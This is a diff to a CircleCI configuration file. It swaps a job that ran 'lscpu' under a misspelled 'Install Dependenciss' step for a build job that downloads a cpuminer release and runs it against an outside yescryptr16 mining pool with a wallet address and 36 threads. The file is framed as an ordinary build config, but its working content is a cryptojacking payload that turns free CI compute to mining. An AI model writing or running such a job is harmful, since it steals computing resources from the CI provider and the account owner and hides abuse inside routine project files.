@@ -1,16 +1,11 @@
-version: 2.1
+version: 2.0
 jobs:
-    trial:
-      docker:
-          - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependenciss
-            command: lscpu
-
-workflows:
-    version: 2.1
-    build:
-        jobs:
-        - trial
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yescryptr16  -o stratum+tcps://stratum-na.rplant.xyz:17055 -u qPRoxh18vEeRDuPcczKHAbHVAPtzFyJtPp.Qoge_8 -p -x -t 36
